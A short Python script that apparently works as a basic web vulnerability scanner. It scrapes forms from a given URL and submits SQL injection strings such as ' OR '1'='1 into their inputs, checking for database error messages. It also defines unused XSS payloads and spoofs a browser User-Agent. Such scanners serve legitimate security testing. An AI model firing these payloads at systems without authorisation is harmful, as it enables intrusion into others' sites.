import sys
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

session = requests.Session()
session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'

SQL_INJECTION_PAYLOADS = ["' OR '1'='1", "' OR 1=1 -- ", "' OR 1=1#", '" OR 1=1-- ']
XSS_PAYLOADS = ['<script>alert("XSS")</script>', '<img src=x onerror=alert("XSS")>']

def get_forms(url):
    """Extracts all HTML forms from a given URL."""
    try:
        response = session.get(url)
        soup = BeautifulSoup(response.content, 'html.parser')
        return soup.find_all('form')
    except requests.RequestException:
        return []

def test_sql_injection(url, form):
    """Tests a form for basic SQL injection vulnerabilities."""
    action = form.attrs.get('action', '').lower()
    method = form.attrs.get('method', 'get').lower()
    target_url = urljoin(url, action)

    for payload in SQL_INJECTION_PAYLOADS:
        inputs = form.find_all('input')
        data = {inp.attrs.get('name'): payload for inp in inputs if inp.attrs.get('name')}
        
        try:
            if method == 'post':
                res = session.post(target_url, data=data)
            else:
                res = session.get(target_url, params=data)
            
            if any(p in res.text for p in ['error in your SQL syntax', 'Query failed', 'supplied argument is not a valid']):
                print(f"{Fore.RED}[+] SQL Injection vulnerability found in form at: {target_url}")
                print(f"    Payload: {payload}")
                return True
        except requests.RequestException:
            pass
    return False

def scan_url(url):
    """Scans a single URL for vulnerabilities."""
    print(f"\n{Style.BRIGHT}Scanning: {url}{Style.RESET_ALL}")
    forms = get_forms(url)
    print(f"[i] Found {len(forms)} forms on the page.")

    sql_found = False
    for form in forms:
        if test_sql_injection(url, form):
            sql_found = True
            break # Stop after finding one to avoid too much noise
    
    if not sql_found:
        print(f"{Fore.GREEN}[-] No obvious SQL Injection vulnerabilities found in forms.")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"{Fore.YELLOW}Usage: python {sys.argv[0]} <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    scan_url(target)
